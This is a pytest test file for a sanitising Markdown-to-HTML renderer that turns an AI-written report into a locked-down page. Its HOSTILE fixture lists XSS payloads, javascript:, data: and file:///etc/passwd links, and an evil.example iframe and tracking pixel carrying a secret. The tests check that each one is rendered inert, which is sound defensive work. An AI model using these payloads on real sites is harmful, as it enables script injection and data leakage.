"""A job's report as a readable page (worker/report_page.py): report.md rendered as report.html beside it, with its
own light and dark styles, which the app opens instead of the raw text (contract 2.4, page_url). The report comes
from a model that read web pages, so nothing in it may run, load or reach out from the page."""

import re
from html.parser import HTMLParser
from pathlib import Path

import pytest

from worker import report_page
from worker.report_page import page_html

FIXTURES = Path(__file__).parent / "fixtures" / "sessions"
HIKE = FIXTURES / "2026-10-11" / "1930" / "jobs" / "01" / "report.md"  # English: a table, a list, bold
LAPTOPS = FIXTURES / "2026-10-15" / "0123" / "jobs" / "01" / "report.md"  # Korean: a picture, a bare source address
CSP = "default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'"


class Tags(HTMLParser):
    """Every tag of a page's body, with its attributes."""

    def __init__(self, html: str) -> None:
        super().__init__()
        self.found: list[tuple[str, dict[str, str | None]]] = []
        self.feed(html[html.index("<body>"):])

    def handle_starttag(self, tag, attrs):
        self.found.append((tag, dict(attrs)))


def body(page: str) -> str:
    return page[page.index("<body>"):]


def test_a_report_becomes_a_page_with_its_headings_lists_tables_and_bold():
    page = page_html(HIKE.read_text())
    assert page.startswith("<!doctype html>\n<html lang=\"en\">")
    assert "<title>Saturday hike: Bukhansan or Gwanaksan</title>" in page
    assert "<h1>Saturday hike: Bukhansan or Gwanaksan</h1>" in page and "<h2>Plan</h2>" in page
    assert "<strong>Pick Gwanaksan, Seoul National University route.</strong>" in page
    assert "<li>Start by 10 am and be down by 2 pm, when the rain chance passes 20%.</li>" in page
    assert '<div class="table"><table>' in page and "<td>4.1 km</td>" in page


def test_the_page_is_readable_on_a_phone_in_light_and_dark():
    """System fonts, a readable width, the app's tokens from the dark mode design (light: background #FFFFFF, ink
    #21200B, secondary ink #6F6E60; dark, as in a sheet: #1C1C1E, #FFFFFF, #ABABB0) by the phone's setting, and a
    table that scrolls sideways rather than squeezing."""
    page = page_html(LAPTOPS.read_text())
    assert '<html lang="ko">' in page and "<title>업무용 13인치와 15인치 노트북</title>" in page
    assert '<meta name="viewport" content="width=device-width, initial-scale=1">' in page
    assert '<meta name="color-scheme" content="light dark">' in page
    style = page[page.index("<style>"):page.index("</style>")]
    light, dark = style.split("@media (prefers-color-scheme: dark)")
    for token in ("--bg: #FFFFFF", "--ink: #21200B", "--ink2: #6F6E60"):
        assert token in light
    for token in ("--bg: #1C1C1E", "--ink: #FFFFFF", "--ink2: #ABABB0"):
        assert token in dark
    assert "-apple-system" in style and "max-width:" in style and "word-break: keep-all" in style
    assert re.search(r"\.table \{[^}]*overflow-x: auto", style)


def test_the_page_lets_nothing_run_or_load():
    """Its own policy allows only its inline styles, and it sends no referrer when a link is followed."""
    page = page_html("# Hi\n")
    assert f'<meta http-equiv="Content-Security-Policy" content="{CSP}">' in page
    assert '<meta name="referrer" content="no-referrer">' in page


HOSTILE = """# Report

<script>alert(1)</script>
<iframe src="https://evil.example/frame"></iframe>

<img src=x onerror=alert(1)> <a href="javascript:alert(1)">raw link</a> <p onclick="alert(1)">raw p</p>

[js](javascript:alert(1)) [vb](VBScript:alert(1)) [data](data:text/html;base64,PHNjcmlwdD4=) [file](file:///etc/passwd)
[rel](comparison.csv) [up](../../../secret.txt) <javascript:alert(1)>
[quoted](https://ok.example/a "x\\" onmouseover=\\"alert(1)")

![remote](https://evil.example/pixel.png?d=secret) ![data](data:image/png;base64,AAAA) ![local](price-chart.svg)

```html"><script>alert(1)</script>
<b>code</b>
```

| a <b>x</b> | b |
|:-|-:|
| `<i>` | [x](javascript:void(0)) |
"""


def test_raw_html_bad_links_and_pictures_in_a_report_stay_words():
    """Raw HTML shows as text; a link to anything but an http, https or mailto address shows its words only; a
    picture shows its words and loads nothing (a remote one would tell its server the report was opened)."""
    page = page_html(HOSTILE)
    tags = Tags(page).found
    assert {t for t, _ in tags} <= {"body", "main", "h1", "p", "a", "span", "pre", "code", "div", "table", "thead",
                                     "tbody", "tr", "th", "td"}
    assert not [t for t, _ in tags if t in ("script", "iframe", "img", "b", "i")]
    assert not [a for _, attrs in tags for a in attrs if a.startswith("on")]
    # The frame's address, now words, is a plain link like any other address in a report; the picture's is nowhere.
    assert [attrs["href"] for t, attrs in tags if t == "a"] == ["https://evil.example/frame", "https://ok.example/a"]
    assert "pixel.png" not in page and "AAAA" not in page and "price-chart.svg" not in page
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page and "&lt;b&gt;code&lt;/b&gt;" in page
    assert '<span class="image">remote</span>' in page and '<span class="image">local</span>' in page
    for words in (">rel<", ">up<", "[js](javascript:alert(1))"):
        assert words.strip("<>") in body(page)


def test_links_stay_links_and_bare_addresses_become_links():
    """A link opens its page, never sending this page's address (rel noreferrer); a source written as a bare
    address becomes a link, ending where the address does: before Korean words or a closing full stop."""
    page = page_html("출처: https://shop.example.com/kr/laptops/. 또 [애플](https://www.apple.com/kr/)과 "
                     "https://www.apple.com/kr에서, 문의 <mailto:help@example.com> (https://a.example/x_(y)).")
    links = [(attrs["href"], attrs["rel"]) for t, attrs in Tags(page).found if t == "a"]
    rel = "noopener noreferrer nofollow"
    assert links == [("https://shop.example.com/kr/laptops/", rel), ("https://www.apple.com/kr/", rel),
                     ("https://www.apple.com/kr", rel), ("mailto:help@example.com", rel),
                     ("https://a.example/x_(y)", rel)]
    assert '</a>에서' in page and '/laptops/</a>.' in page and "x_(y)</a>)." in page
    code = page_html("`https://a.example` and\n\n    https://b.example\n")
    assert "<a " not in code  # an address in code stays code


def test_an_address_with_an_apostrophe_stays_a_link():
    """Attribute values are written in double quotes and escaped, so an apostrophe in an address is harmless; such a
    link (Wikipedia's Schrödinger's_cat) used to show only its words."""
    page = page_html("[cat](https://en.wikipedia.org/wiki/Schrödinger's_cat) and "
                     "https://en.wikipedia.org/wiki/Schr%C3%B6dinger's_cat.\n")
    cat = "https://en.wikipedia.org/wiki/Schr%C3%B6dinger's_cat"
    assert [attrs["href"] for t, attrs in Tags(page).found if t == "a"] == [cat, cat]


def test_an_address_with_korean_in_its_path_links_to_its_own_page():
    """Review of the pages: a bare address stopped at its first letter outside ASCII, so Korean sources and
    Schrödinger's_cat linked to another page. Letters with accents belong to an address; Korean and other scripts go
    on where a path segment or a query value begins, so "https://apple.com/kr에서" still ends before "에서"."""
    from urllib.parse import unquote

    page = page_html("https://namu.wiki/w/노트북 https://ko.wikipedia.org/wiki/서울특별시 "
                     "https://search.naver.com/search.naver?query=노트북&where=web "
                     "https://en.wikipedia.org/wiki/Schrödinger's_cat (https://ru.wikipedia.org/wiki/Москва). "
                     "https://apple.com/kr에서\n")
    assert [unquote(attrs["href"]) for t, attrs in Tags(page).found if t == "a"] == [
        "https://namu.wiki/w/노트북", "https://ko.wikipedia.org/wiki/서울특별시",
        "https://search.naver.com/search.naver?query=노트북&where=web", "https://en.wikipedia.org/wiki/Schrödinger's_cat",
        "https://ru.wikipedia.org/wiki/Москва", "https://apple.com/kr"]
    assert "</a>에서" in page and "Москва</a>)." in page


def test_a_report_made_to_be_slow_renders_in_time_proportional_to_its_length():
    """Review of the pages: trimming an address counted it whole again for each closing bracket it took off, so an
    address followed by 80 KB of brackets took 4 s (hours at the 5 MB a file may have)."""
    import time

    start = time.perf_counter()
    page_html("https://a.b/" + ")" * 80_000)
    assert time.perf_counter() - start < 1.0


def test_every_page_passes_the_tag_check_and_a_page_that_would_not_is_never_made():
    """The HTML that comes out is checked against the tags and attributes the renderer makes; anything else stops
    the page (the app then shows the report's text as it is)."""
    for text in (HIKE.read_text(), LAPTOPS.read_text(), HOSTILE):
        report_page.check(body(page_html(text)))
    for bad in ('<body><img src="x"></body>', '<body><a href="javascript:x">x</a></body>',
                '<body><p onclick="x">x</p></body>', '<body><td style="color:red">x</td></body>',
                '<body><a href="https://a.example" target="_blank">x</a></body>'):
        with pytest.raises(ValueError):
            report_page.check(bad)


def test_no_worker_writes_the_page_itself(tmp_path):
    """The page is this Mac's rendering of the report: a model's save_file of report.html is refused (in any case of
    letters), and a code execution file of that name is saved under another."""
    from worker.tools import allowed_name, free_name

    assert not allowed_name("report.html") and not allowed_name("Report.HTML")
    assert free_name(tmp_path, "report.html", "output-1.html") == "output-1.html"


def test_the_page_is_written_beside_the_report_and_only_then(tmp_path):
    assert report_page.write_page(tmp_path) is None and not list(tmp_path.iterdir())
    (tmp_path / "report.md").write_text("# 제목\n\n본문\n")
    assert report_page.write_page(tmp_path) == tmp_path / "report.html"
    assert "<h1>제목</h1>" in (tmp_path / "report.html").read_text()
    assert sorted(p.name for p in tmp_path.iterdir()) == ["report.html", "report.md"]  # no temporary file left


def test_a_job_s_page_is_rendered_by_a_process_of_its_own_within_a_time_limit(tmp_path, monkeypatch):
    """Review of the pages: rendering is Python that holds the interpreter lock (markdown-it-py takes over a second
    on 160 KB of nested brackets), and the call's process carries live audio, so a job's page is rendered by another
    Python process, stopped at a time limit. Here this process's renderer is broken, and the page is still made."""
    import sys
    import time

    def broken(markdown):
        raise AssertionError("rendered in the call's own process")

    monkeypatch.setattr(report_page, "page_html", broken)
    report_page.render_apart(tmp_path)  # no report: nothing to render, no process started
    assert not list(tmp_path.iterdir())
    (tmp_path / "report.md").write_text("# 제목\n")
    report_page.render_apart(tmp_path)
    assert "<h1>제목</h1>" in (tmp_path / "report.html").read_text()

    (tmp_path / "report.html").unlink()
    monkeypatch.setattr(report_page, "RENDER", [sys.executable, "-c", "import time; time.sleep(30)"])
    start = time.monotonic()
    with pytest.raises(TimeoutError):
        report_page.render_apart(tmp_path, limit_s=0.5)
    assert time.monotonic() - start < 10 and not (tmp_path / "report.html").exists()
    monkeypatch.setattr(report_page, "RENDER", [sys.executable, "-c", "import sys; sys.exit('a tag: x')"])
    with pytest.raises(RuntimeError, match="a tag: x"):
        report_page.render_apart(tmp_path)


def test_older_reports_get_their_page_from_the_one_off_command(tmp_path, capsys):
    """`python -m worker.report_page data/people/<id>` renders each report from before pages existed; a page already
    there is left alone."""
    old = tmp_path / "2026-10-11" / "1930" / "jobs" / "01"
    done = tmp_path / "2026-10-15" / "0123" / "jobs" / "01"
    for folder in (old, done):
        folder.mkdir(parents=True)
        (folder / "report.md").write_text(HIKE.read_text())
    (done / "report.html").write_text("kept")
    report_page.main([str(tmp_path)])
    assert "<h2>Plan</h2>" in (old / "report.html").read_text() and (done / "report.html").read_text() == "kept"
    out = capsys.readouterr().out
    assert f"{old / 'report.html'}: rendered" in out and str(done) not in out
